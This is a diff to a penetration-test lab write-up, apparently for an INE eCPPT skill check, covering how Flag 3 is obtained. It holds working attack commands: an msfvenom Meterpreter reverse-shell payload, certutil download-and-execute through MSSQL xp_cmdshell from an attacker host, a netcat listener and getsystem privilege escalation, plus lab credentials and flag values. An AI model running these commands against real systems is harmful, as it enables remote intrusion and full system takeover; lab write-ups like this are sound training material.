@@ -100,7 +100,6 @@ get flag1.txt
 username: timmy
 password: def_32121_@#
 ```
-Here is the updated section of your report with the steps taken to achieve **Flag 2** and recommendations for next steps:
 
 ---
 
@@ -166,18 +165,81 @@ Successfully escalated from `guest` MSSQL user to `sa`, enabled command executio
 
 ---
 
-## 🔜 **Next Steps (Flag 3)**
+## **INE eCPPT Skill Check Lab — SNMP & Privilege Escalation — Flag 3 Walkthrough**
 
-Now that command execution is enabled on the target system:
+---
 
-1. **Establish a reverse shell** using a staged payload (e.g., PowerShell or a downloaded executable).
+### Step 9 — Spawn Reverse Shell with `xp_cmdshell`
 
-   * Example: Use `xp_cmdshell` with `certutil` to download and execute `shell.exe`
-   * Ensure listener is active and correct port is not in use (`nc -lvnp 4444` or similar)
-2. **Check privileges of the MSSQL service user:**
+* Created a reverse shell executable with `msfvenom`:
 
-   * Already confirmed to be `NT SERVICE\MSSQL$SQLEXPRESS`
-   * Has `SeImpersonatePrivilege` – indicates **Juicy Potato/Rogue Potato** may be viable for privilege escalation to SYSTEM
-3. **Upload and run privilege escalation binary** (e.g., `JuicyPotato.exe`) from within the reverse shell session
-4. **Retrieve Flag 3** once SYSTEM access is obtained
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.41.9 LPORT=4444 -f exe -o shell.exe
+```
 
+* Hosted with Python HTTP server:
+
+```bash
+python3 -m http.server 80
+```
+
+* Downloaded on target via `xp_cmdshell`:
+
+```sql
+EXEC xp_cmdshell 'certutil -urlcache -split -f http://10.10.41.9/shell.exe C:\Windows\Temp\shell.exe';
+EXEC xp_cmdshell 'C:\Windows\Temp\shell.exe';
+```
+
+* Listener on attack machine:
+
+```bash
+nc -lvnp 4444
+```
+
+**Result:** Meterpreter session opened.
+
+---
+
+### Step 10 — Privilege Escalation (getsystem)
+
+From Meterpreter:
+
+```bash
+getsystem
+```
+
+**Result:**
+
+```
+...got system via technique 5 (Named Pipe Impersonation)
+```
+
+---
+
+### Step 11 — Retrieve Flag 3
+
+```bash
+cd C:\Users\Administrator\Desktop
+ls
+type flag3.txt
+```
+
+**Flag 3 Retrieved:**
+
+```
+4afc6acaf56645268ab47551efa7864f
+```
+
+---
+
+## ✅ **Flag 3 Complete**
+
+SYSTEM access achieved and third flag retrieved successfully. The lab demonstrates a full chain: enumeration → SMB login → MSSQL abuse → reverse shell → SYSTEM → data exfiltration.
+
+---
+
+**Status:**
+
+✅ Flag 1: Retrieved via SMB share access
+✅ Flag 2: Retrieved via MSSQL `xp_cmdshell`
+✅ Flag 3: Retrieved via Meterpreter shell after privilege escalation
